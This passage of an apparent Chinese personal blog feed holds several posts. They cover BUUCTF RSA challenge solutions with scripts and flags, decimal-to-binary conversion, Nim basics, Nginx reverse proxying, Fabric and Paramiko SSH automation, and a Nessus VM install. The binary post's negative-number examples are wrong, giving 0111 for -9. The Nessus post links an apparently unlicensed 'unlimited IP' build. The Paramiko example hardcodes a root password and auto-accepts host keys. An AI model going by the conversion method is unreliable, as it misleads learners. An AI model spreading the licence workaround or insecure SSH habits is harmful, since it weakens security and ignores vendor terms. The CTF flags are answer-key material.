punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>int<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><code>flag{13212je2ue28fy71w8u87y31r78eu1e2}</code></p><h2 id="BJDCTF-2nd-rsa0"><a href="#BJDCTF-2nd-rsa0" class="headerlink" title="[BJDCTF 2nd]rsa0"></a>[BJDCTF 2nd]rsa0</h2><p>挺简单的, 给了<code>p+q</code>和<code>p-q</code>的结果, 用幼儿园数学就可以解出来.<br>写个脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> libnump_q <span class="token operator">=</span> <span class="token number">23739288354455618823500789320882015507916235495298919211105643329075951209068787630098346460475927331769393616566728637534240820048596719327537779749309942</span>p__q <span class="token operator">=</span> <span class="token number">948302319808573594690404166522167040466682672257436846156503266017624344686672560965640249175574642110944426131051410227570706455318246794290130811495220</span>q <span class="token operator">=</span> <span class="token punctuation">(</span>p_q <span class="token operator">-</span> p__q<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>p <span class="token operator">=</span> p_q <span class="token operator">-</span> qn <span class="token operator">=</span> p <span class="token operator">*</span> qe <span class="token operator">=</span> <span class="token number">14319223</span>d <span class="token operator">=</span> libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c<span class="token operator">=</span><span class="token number">15149744517033579581121079919371536543625764309178093114222222083997624880804403990685225551641742250133869348431666895839971706066083354772440919051386874078900267911498803910425195536370033292591575354103143983614210191790171674997710390856232217787490303852272027717390320852706104910007664891405492668536</span>m <span class="token operator">=</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span></code></pre><p><code>flag{21c569ae-3068-4b9f-97f1-784ab48863d9}</code></p><hr><p>刷到什么题就更新。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BUUCTF, 自己学习的过程中思路记录, 以及flag…  (目的是记录自己的思路和想法！！！)&lt;/p&gt;
&lt;p&gt;题目地址: &lt;a href=&quot;https://buuoj.cn/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;BUUCTF&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
      <category term="BUUCTF" scheme="https://helianthus.top/tags/BUUCTF/"/>
    
      <category term="Crypto" scheme="https://helianthus.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>手算正反十进制转换二进制过程</title>
    <link href="https://helianthus.top/2019/10/28/7-Dec-to-Bin-Calc/"/>
    <id>https://helianthus.top/2019/10/28/7-Dec-to-Bin-Calc/</id>
    <published>2019-10-27T19:57:06.000Z</published>
    <updated>2020-05-27T23:38:03.514Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下手算十进制到二进制, 包括正数和负数转换二进制.</p><a id="more"></a><h2 id="十进制正数-转换-二进制"><a href="#十进制正数-转换-二进制" class="headerlink" title="十进制正数 转换 二进制"></a>十进制正数 转换 二进制</h2><ol><li>除以2的整数结果除以2到0为止.</li><li>结果从下往上看.</li></ol><ul><li><p>Example: 把9计算成2进制.</p><pre><code>99/2  = 4 -&gt; 1  ; 9/2=4.5 把小数点忽略, 就是4, 因为有小数点, 所以这个位置就是1.4/2  = 2 -&gt; 0  ; 4/2=2 没有小数点, 这个位置就是0.2/2  = 1 -&gt; 0  ; 结果等于1的时候还要进行除.1/2  = 0 -&gt; 1  ; 结果为0的时候才能结束, 1/2=0.5, 有余数, 所以为1.从下向上看, 排序1001, 这个计算的结果从上到下和从下到上都一样...</code></pre></li><li><p>Example: 把27计算2进制.</p><pre><code>2727/2 = 13 -&gt; 113/2 = 6  -&gt; 16/2  = 3  -&gt; 03/2  = 1  -&gt; 11/2  = 0  -&gt; 1结果是: 0001 1011</code></pre></li></ul><h2 id="十进制负数-转换-二进制"><a href="#十进制负数-转换-二进制" class="headerlink" title="十进制负数 转换 二进制"></a>十进制负数 转换 二进制</h2><ol><li>计算负数<code>绝对值</code>的二进制结果.</li><li>将第一步计算的结果进行取反.</li><li>取反后+1, 就是最终结果</li><li>64位的, 计算的内容前面填充1.</li></ol><ul><li>Example: 把-9转换二进制<pre><code>99/2 4 14/2 2 02/2 1 01/2 0 1</code></pre></li></ul><p>源码: 1001<br>反码: 0110<br>补码: 反码 + 1 : 0111</p><p>结果: 0111</p><pre><code>- Example: 把-15转换二进制</code></pre><p>15<br>15/2 7 1<br>7/2  3 1<br>3/2  1 1<br>1/2  0 1</p><p>源码: 1111<br>反码: 0000<br>补码: 0001</p><p>结果: 0001<br>```</p><hr><p>其他数计算都是这个步骤, 去尝试一下吧~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习一下手算十进制到二进制, 包括正数和负数转换二进制.&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="https://helianthus.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="进制转换" scheme="https://helianthus.top/tags/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/"/>
    
      <category term="二进制" scheme="https://helianthus.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Nim编程语言快速入门 (附代码例子)</title>
    <link href="https://helianthus.top/2019/10/03/6-Nim-Programming-Language/"/>
    <id>https://helianthus.top/2019/10/03/6-Nim-Programming-Language/</id>
    <published>2019-10-03T13:12:29.000Z</published>
    <updated>2020-05-27T23:38:40.330Z</updated>
    
    <content type="html"><![CDATA[<p>Nim是一种静态类型编译的系统编程语言, 它结合了其他成熟语言的成功概念, 这次就带你5分钟学会Nim的编写, 来跟我一起尝试一下吧.</p><a id="more"></a><p>Nim官网: <a href="https://Nim-lang.org/" target="_blank" rel="noopener">https://Nim-lang.org/</a><br>Nim中文社区: <a href="https://Nim-lang-cn.org/" target="_blank" rel="noopener">https://Nim-lang-cn.org/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>花了半小时的时间去试了试这门语言, 可以通过Nim生成js或者c的代码以及可执行文件, 感觉蛮酷的, 做个分享.</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>Nim编译出一个exe文件是这么做的:</p><pre class=" language-shell"><code class="language-shell">Nim c main.Nim</code></pre><p>Nim 编译出一个js文件是这么做的:</p><pre class=" language-shell"><code class="language-shell">Nim js main.Nim</code></pre><p>发没发现? 只需要更改Nim <type> 中的内容就可以了.</type></p><p>不过, 你无法编译成”世界上最好的语言”, 比如<code>Nim php main.Nim</code>, 会报错的！！</p><h2 id="超级详细带代码体验"><a href="#超级详细带代码体验" class="headerlink" title="超级详细带代码体验"></a>超级详细带代码体验</h2><h4 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h4><h5 id="基本变量类型"><a href="#基本变量类型" class="headerlink" title="基本变量类型"></a>基本变量类型</h5><pre class=" language-Nim"><code class="language-Nim"># 指定类型var name: string = "HelloWorld"# 类型推断var i = 10</code></pre><h5 id="列表-数组"><a href="#列表-数组" class="headerlink" title="列表(数组)"></a>列表(数组)</h5><pre class=" language-Nim"><code class="language-Nim">var list = @[1,2,3,4,5]</code></pre><p>加上<code>@</code>符号表明是动态数组, 可以进行<code>Add</code>和<code>POP</code>操作.</p><h5 id="Table-在Py叫Dict-Go叫Map"><a href="#Table-在Py叫Dict-Go叫Map" class="headerlink" title="Table(在Py叫Dict, Go叫Map)"></a>Table(在Py叫Dict, Go叫Map)</h5><pre class=" language-Nim"><code class="language-Nim">import tablesvar dict = {"one": "HeliantHuS"}.toTable# 取值echo dict["one"]  # HeliantHuS</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><pre class=" language-Nim"><code class="language-Nim"># 打印HelloWorldecho "HelloWorld"</code></pre><p>Nim中的注释和Python一样.</p><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><h5 id="case-of"><a href="#case-of" class="headerlink" title="case-of"></a>case-of</h5><pre class=" language-Nim"><code class="language-Nim">var name: string = readLine(stdin)# case就等于其他语言的switch, of就相当于casecase nameof "":    echo "你不可以输入空的哦."of "HeliantHuS":    echo "HeliantHuS is Handsome"else:    echo "我没看懂你输入的是什么"</code></pre><h5 id="if-elif-else"><a href="#if-elif-else" class="headerlink" title="if-elif-else"></a>if-elif-else</h5><pre class=" language-Nim"><code class="language-Nim">import strformatvar name: string = readLine(stdin)if name == "HeliantHuS":    echo fmt"Hello, {name}"elif name == "exit":    echo "Exit!!!"else:    echo "没有匹配~"</code></pre><p><img src="/images/6/strfmt.jpg" alt></p><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><h5 id="while"><a href="#while" class="headerlink" title="while"></a>while</h5><p>while 没什么好说的, Python有的它也有.</p><pre class=" language-nil"><code class="language-nil">while true:    echo "Hello"</code></pre><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><pre class=" language-Nim"><code class="language-Nim">for i in countup(1, 10):    echo ifor i in 1..10:    echo i</code></pre><p>上面两段代码效果一样, 可以看出来比Python还要简洁.</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="定义一个函数"><a href="#定义一个函数" class="headerlink" title="定义一个函数"></a>定义一个函数</h5><pre class=" language-Nim"><code class="language-Nim">import strformatproc hello(name: string): string =    return fmt"Hello, {name}"</code></pre><h5 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h5><pre class=" language-Nim"><code class="language-Nim">var result = hello("HeliantHuS")echo result</code></pre><h5 id="舍弃函数返回值"><a href="#舍弃函数返回值" class="headerlink" title="舍弃函数返回值"></a>舍弃函数返回值</h5><pre class=" language-Nim"><code class="language-Nim">discard hello("HeliantHuS")</code></pre><p>在Nim中, 函数必须要有返回值, 你就必须要去用变量去接收或者直接echo, 不然会报错, 有时候函数的返回值也许不重要, 就需要去舍弃, 就要用关键字<code>discard</code>去舍弃.</p><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><h5 id="block"><a href="#block" class="headerlink" title="block"></a>block</h5><pre class=" language-Nim"><code class="language-Nim">block hello:    echo "HelloWorld"</code></pre><p>Nim中也是使用缩进进行作用域的区分.</p><blockquote><p>道理我都懂, 可我好像真的对你着迷.</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Nim是一种静态类型编译的系统编程语言, 它结合了其他成熟语言的成功概念, 这次就带你5分钟学会Nim的编写, 来跟我一起尝试一下吧.&lt;/p&gt;
    
    </summary>
    
    
      <category term="Nim" scheme="https://helianthus.top/categories/Nim/"/>
    
    
      <category term="Nim" scheme="https://helianthus.top/tags/Nim/"/>
    
      <category term="元编程" scheme="https://helianthus.top/tags/%E5%85%83%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Nginx反向代理骚操作详解</title>
    <link href="https://helianthus.top/2019/10/03/5-Nginx-Config-ServerName/"/>
    <id>https://helianthus.top/2019/10/03/5-Nginx-Config-ServerName/</id>
    <published>2019-10-02T22:37:31.000Z</published>
    <updated>2020-05-27T23:35:56.744Z</updated>
    
    <content type="html"><![CDATA[<p>Nginx是一个的静态文件和反向代理服务，轻量，方便部署，而且性能极高.<br>看完这篇文章, 你将点亮NGINX配置<code>虚拟主机</code>, <code>反向代理</code>等技能点.</p><a id="more"></a><h2 id="深入浅出"><a href="#深入浅出" class="headerlink" title="深入浅出"></a>深入浅出</h2><pre class=" language-js"><code class="language-js">worker_processes  <span class="token number">1</span><span class="token punctuation">;</span>events <span class="token punctuation">{</span>    worker_connections  <span class="token number">1024</span><span class="token punctuation">;</span><span class="token punctuation">}</span>http <span class="token punctuation">{</span>    include       mime<span class="token punctuation">.</span>types<span class="token punctuation">;</span>    default_type  application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    sendfile        on<span class="token punctuation">;</span>    keepalive_timeout  <span class="token number">65</span><span class="token punctuation">;</span>    server <span class="token punctuation">{</span>        listen       <span class="token number">80</span><span class="token punctuation">;</span>        server_name  localhost<span class="token punctuation">;</span>        location <span class="token operator">/</span> <span class="token punctuation">{</span>            root   html<span class="token punctuation">;</span>            index  index<span class="token punctuation">.</span>html index<span class="token punctuation">.</span>htm<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>上面这是一个<code>nginx</code>最基本的配置, 分<code>http</code>代码块, <code>server</code>代码块, 其中今天要玩的就是<code>server</code>这个代码块.</p><h2 id="开始操作"><a href="#开始操作" class="headerlink" title="开始操作"></a>开始操作</h2><p>首先在<code>nginx</code>的静态文件夹保证有两个<code>html文件</code>, 分别为<code>index.html</code>、<code>page1.html</code>, 里面的内容自己随便写, 只要能分清楚是哪个文件就好.</p><h4 id="正常启动"><a href="#正常启动" class="headerlink" title="正常启动"></a>正常启动</h4><p>正常启动Nginx, 访问通过服务器地址访问, 会访问到<code>index.html</code>的内容.<br><img src="/images/5/indexpage.jpg" alt></p><h4 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h4><p>第一个server代码块不需要更改, 下面紧接着添加:</p><pre class=" language-conf"><code class="language-conf">    server {        listen 80;        server_name page1.com;        location / {            root html;            index page1.html;        }    }</code></pre><p>这样, 只要访问这个服务器的时候，请求头的<code>Host</code>键内容为<code>page1.com</code>, 可以通过抓包或者修改<code>hosts</code>文件的方式来达到目的.<br><img src="/images/5/page1.jpg" alt></p><h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>第二个server代码块不需要更改, 修改第一个server代码块的内容为:</p><pre class=" language-conf"><code class="language-conf">    server {        listen 80;        server_name localhost;        location / {            proxy_pass http://hls.easy.echosite.cn/;        }    }</code></pre><p>重启服务器, 访问<code>localhost</code>或者服务器真实IP, 你会发现, 显示的结果是你输入的<code>http://hls.easy.echosite.cn</code>的内容, 但是浏览器的URL依旧是<code>localhost</code>或服务器IP.<br><img src="/images/5/proxy.jpg" alt></p><h4 id="防盗链配置"><a href="#防盗链配置" class="headerlink" title="防盗链配置"></a>防盗链配置</h4><p>原理: 通过nginx的if判断, 只允许通过合法的域名访问本网站, 其余的域名访问本网站的时候直接返回403。</p><pre class=" language-conf"><code class="language-conf">server {    listen 80;    server_name youdoamin.com;    if ($host !~* ^youdomain.com$)    {        return 403;    }    location / {        root html;        index index.html index.htm;    }}</code></pre><p>临了, 最后的配置文件样子:<br><img src="/images/5/conf.jpg" alt></p><p>其实Nginx还有很多脚本类的东西, 太过深入就需要自己去研究了, NGINX一般还是作为接入层的反向代理去使用, 配置方便, 也轻量, 真的是做WEB必备的反向代理服务.</p><p>最后~ 文章中演示的<code>hls.easy.echosite.cn</code>是使用<a href="https://www.echosite.cn" target="_blank" rel="noopener">EchoSite2.0 内网穿透，就选他了！</a>所内网穿透用来测试的, 如果有需要内网穿透的可以了解一下.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Nginx是一个的静态文件和反向代理服务，轻量，方便部署，而且性能极高.&lt;br&gt;看完这篇文章, 你将点亮NGINX配置&lt;code&gt;虚拟主机&lt;/code&gt;, &lt;code&gt;反向代理&lt;/code&gt;等技能点.&lt;/p&gt;
    
    </summary>
    
    
      <category term="运维" scheme="https://helianthus.top/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="Nginx" scheme="https://helianthus.top/tags/Nginx/"/>
    
      <category term="HTTP" scheme="https://helianthus.top/tags/HTTP/"/>
    
      <category term="Proxy" scheme="https://helianthus.top/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>Fabric Python远程部署利器</title>
    <link href="https://helianthus.top/2019/10/01/4-Fabric-Python-Remote-deploy/"/>
    <id>https://helianthus.top/2019/10/01/4-Fabric-Python-Remote-deploy/</id>
    <published>2019-09-30T18:00:51.000Z</published>
    <updated>2020-05-27T23:33:38.415Z</updated>
    
    <content type="html"><![CDATA[<p>Fabric是一个Python的第三方库，可以进行Linux的远程部署，批量执行各种命令，况且，机器出错的次数比你少多了呢。<br>(附详细的SSH免密登录过程)</p><a id="more"></a><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><ul><li>Windows10的WSL IP: <code>192.168.1.66</code> 下面简称<code>物理机</code>.</li><li>VMware Centos服务器 IP: <code>192.168.1.40</code> 下面简称<code>服务器</code>.</li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ul><li>Python3</li><li>类Linux操作系统 | 没有Linux用Windows的WSL也可以.</li></ul><h2 id="技术难点"><a href="#技术难点" class="headerlink" title="技术难点"></a>技术难点</h2><ul><li>SSH免密登录.</li></ul><h2 id="深入浅出"><a href="#深入浅出" class="headerlink" title="深入浅出"></a>深入浅出</h2><h4 id="SSH免密"><a href="#SSH免密" class="headerlink" title="SSH免密"></a>SSH免密</h4><p>使用<code>ssh-keygen</code>命令在物理机生成公钥和私钥, 生成完毕后在当前登录的用户目录下<code>.ssh</code>文件夹下.<br><img src="/images/4/ssh-keygen.jpg" alt></p><p>在服务器中的<code>.ssh</code>文件夹下创建一个名为<code>authorized_keys</code>文件并设置权限为<code>600</code>.</p><pre class=" language-shell"><code class="language-shell">cd ~/.sshtouch authorized_keyschmod 600 authorized_keys</code></pre><p>将物理机的<code>id_rsa.pub</code>里面的内容复制进服务器新建的<code>authorized_keys</code>中.<br>可以使用<code>scp</code>命令，将<code>id_rsa.pub</code>文件发送到服务器中，然后使用<code>cat</code>命令将<code>id_rsa.pub</code>的内容追加到<code>authorized_keys</code>文件中.<br>物理机:</p><pre class=" language-shell"><code class="language-shell">scp ~/.ssh/id_rsa.pub root@192.168.1.40:~/.ssh/</code></pre><p>服务器:</p><pre><code>cat id_rsa.pub &gt;&gt; authorized_keys</code></pre><p><img src="/images/4/scp.jpg" alt><br><img src="/images/4/cat.jpg" alt></p><p>使用物理机远程SSH连接服务器验证是否免密成功<br><img src="/images/4/ssh.jpg" alt></p><h4 id="安装Fabric"><a href="#安装Fabric" class="headerlink" title="安装Fabric"></a>安装Fabric</h4><p>在物理机执行下面的安装命令即可安装完毕.</p><pre class=" language-shell"><code class="language-shell">python3 -m pip install fabric</code></pre><p>找一个空的目录新建名为<code>fabfile.py</code>的文件.<br><img src="/images/4/touch.jpg" alt></p><h4 id="编写Fabric脚本"><a href="#编写Fabric脚本" class="headerlink" title="编写Fabric脚本"></a>编写Fabric脚本</h4><p>使用<code>vim</code>编辑刚刚新建的py文件.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> fabric <span class="token keyword">import</span> Connection<span class="token punctuation">,</span> task@task<span class="token keyword">def</span> <span class="token function">devploy</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Connection<span class="token punctuation">(</span><span class="token string">"root@192.168.1.40"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token punctuation">:</span>        c<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"ifconfig"</span><span class="token punctuation">)</span></code></pre><p>写入完毕后保存，运行<code>fab deploy</code>即可看到服务器的执行回显.<br><img src="/images/4/fab.jpg" alt></p><p>可以用来一键替换更新yum源, 代码如下:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> fabric <span class="token keyword">import</span> Connection<span class="token punctuation">,</span> task@task<span class="token keyword">def</span> <span class="token function">deploy</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> Connection<span class="token punctuation">(</span><span class="token string">"root@192.168.1.40"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token punctuation">:</span>        c<span class="token punctuation">.</span>run<span class="token punctuation">(</span>'cd <span class="token operator">/</span>etc<span class="token operator">/</span>yum<span class="token punctuation">.</span>repos<span class="token punctuation">.</span>d<span class="token operator">/</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            mv CentOS<span class="token operator">-</span>Media<span class="token punctuation">.</span>repo CentOS<span class="token operator">-</span>Media<span class="token punctuation">.</span>repo<span class="token punctuation">.</span>backup <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            wget http<span class="token punctuation">:</span><span class="token operator">//</span>mirrors<span class="token number">.163</span><span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token punctuation">.</span>help<span class="token operator">/</span>CentOS7<span class="token operator">-</span>Base<span class="token number">-163.</span>repo <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            yum clean all <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            yum makecache <span class="token operator">&amp;</span><span class="token operator">&amp;</span> \            yum update'<span class="token punctuation">)</span></code></pre><p><img src="/images/4/yum.jpg" alt></p><p>不是不愿意学习新的东西, 而是想知道学习这个能做什么, 加油.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Fabric是一个Python的第三方库，可以进行Linux的远程部署，批量执行各种命令，况且，机器出错的次数比你少多了呢。&lt;br&gt;(附详细的SSH免密登录过程)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://helianthus.top/categories/Python/"/>
    
    
      <category term="Python" scheme="https://helianthus.top/tags/Python/"/>
    
      <category term="fabric" scheme="https://helianthus.top/tags/fabric/"/>
    
      <category term="远程部署" scheme="https://helianthus.top/tags/%E8%BF%9C%E7%A8%8B%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Nessus系统漏洞扫描平台(VMware傻瓜式安装)</title>
    <link href="https://helianthus.top/2019/09/30/3-Nessus-Install-or-Use-and-License/"/>
    <id>https://helianthus.top/2019/09/30/3-Nessus-Install-or-Use-and-License/</id>
    <published>2019-09-29T21:44:44.000Z</published>
    <updated>2020-05-27T23:32:38.062Z</updated>
    
    <content type="html"><![CDATA[<p>最懊恼的就是安装这种软件了，免费版本只能扫描16个IP，收费版本在天朝没人会去买，买完也没人去分享，而现在，我来安利一波可以无限IP，而且还傻瓜式的Nessus安装方式.</p><a id="more"></a><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2><ol><li>VMware Workstation (Version &gt;= 12)</li><li>科学上网工具</li><li>眼睛和脑子</li></ol><h2 id="下载Nessus-VMware版"><a href="#下载Nessus-VMware版" class="headerlink" title="下载Nessus(VMware版)"></a>下载Nessus(VMware版)</h2><p><a href="https://mega.nz/#!0YkSDYpY!JndpKpH5yB3hDNV-091jOwPhW9rLK9iNSzuF9nTz-i0" target="_blank" rel="noopener">https://mega.nz/#!0YkSDYpY!JndpKpH5yB3hDNV-091jOwPhW9rLK9iNSzuF9nTz-i0</a></p><h2 id="部署Nessus"><a href="#部署Nessus" class="headerlink" title="部署Nessus"></a>部署Nessus</h2><h4 id="导入至VMware"><a href="#导入至VMware" class="headerlink" title="导入至VMware"></a>导入至VMware</h4><p>首先解压下载的压缩文件，放到你能记得住的地方</p><p>然后打开<code>vmware</code>, <code>File -&gt; Open</code>, 选择<code>Nessus 8_VM12.ovf</code>文件.</p><p><img src="/images/3/vmware1.jpg" alt><br><img src="/images/3/vmware2.jpg" alt></p><h4 id="开机运行-配置网卡"><a href="#开机运行-配置网卡" class="headerlink" title="开机运行 配置网卡"></a>开机运行 配置网卡</h4><p>默认的用户名和密码都在描述中写了, 按照描述进行操作绝对没问题的.<br><img src="/images/3/description.jpg" alt></p><p>开机你肯定没问题了，按照他的要求访问<code>https://1.1.2.1:8834</code>你肯定访问不了，你需要修改网卡配置</p><p>这样，将网卡2改成NAT<br><img src="/images/3/setting.jpg" alt></p><p>就可以自动获取IP地址, 获取完毕直接输入<code>ifconfig</code>查看自动获取的IP地址, 访问自动获取的IP地址加端口号…哦对了, 一定要是<code>https</code>, 比如我自动获取的IP地址为<code>192.168.23.134</code>, 那么我在我物理机访问<code>https://192.168.23.134:8834</code>就可以了.<br><img src="/images/3/nessus.jpg" alt></p><p>到这里就完全可以正常运行以及进行扫描了, 怎么运行扫描就要看你了, 赶紧继续学习吧~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最懊恼的就是安装这种软件了，免费版本只能扫描16个IP，收费版本在天朝没人会去买，买完也没人去分享，而现在，我来安利一波可以无限IP，而且还傻瓜式的Nessus安装方式.&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络安全" scheme="https://helianthus.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://helianthus.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="扫描" scheme="https://helianthus.top/tags/%E6%89%AB%E6%8F%8F/"/>
    
      <category term="漏洞" scheme="https://helianthus.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Paramiko Python远程连接工具</title>
    <link href="https://helianthus.top/2019/09/29/2-paramiko-remote-exec/"/>
    <id>https://helianthus.top/2019/09/29/2-paramiko-remote-exec/</id>
    <published>2019-09-28T22:38:02.000Z</published>
    <updated>2020-05-27T23:35:06.425Z</updated>
    
    <content type="html"><![CDATA[<p>Paramiko是一个Python的远程操作库，可以进行<code>SSH</code>, <code>SFTP</code>等远程连接操作. 来学习学习怎么使用吧</p><a id="more"></a><h1 id="安装Paramiko"><a href="#安装Paramiko" class="headerlink" title="安装Paramiko"></a>安装Paramiko</h1><pre class=" language-shell"><code class="language-shell">    python3 -m pip install paramiko</code></pre><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><h3 id="导入paramiko"><a href="#导入paramiko" class="headerlink" title="导入paramiko"></a>导入paramiko</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> paramiko</code></pre><h3 id="初始化SSHClient"><a href="#初始化SSHClient" class="headerlink" title="初始化SSHClient"></a>初始化SSHClient</h3><pre class=" language-python"><code class="language-python">client <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="连接主机"><a href="#连接主机" class="headerlink" title="连接主机"></a>连接主机</h3><p>我的<code>Linux</code>主机是<code>192.168.1.40</code>，用户名为<code>root</code>, 密码为<code>admin123.</code></p><pre class=" language-python"><code class="language-python">client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>hostname<span class="token operator">=</span><span class="token string">"192.168.1.40"</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"admin123."</span><span class="token punctuation">)</span></code></pre><p><img src="/images/2/warning.jpg" alt="warning"><br>连接上会有几条警告，可以无视掉，或者直接<a href="https://github.com/paramiko/paramiko/issues/1386#issuecomment-470847772" target="_blank" rel="noopener">屏蔽警告信息</a></p><h3 id="发送命令"><a href="#发送命令" class="headerlink" title="发送命令"></a>发送命令</h3><p>执行一个<code>ifconfig</code>命令</p><pre class=" language-python"><code class="language-python">stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> client<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">"ifconfig"</span><span class="token punctuation">)</span></code></pre><p>注意这里, <code>exec_command</code>的返回值为tuple类型<br>可以通过<code>python3 -m pydoc paramiko.SSHClient.exec_command</code>查看源码.<br><img src="/images/2/pydoc.jpg" alt="PyDoc"></p><h3 id="查看命令返回值"><a href="#查看命令返回值" class="headerlink" title="查看命令返回值"></a>查看命令返回值</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token 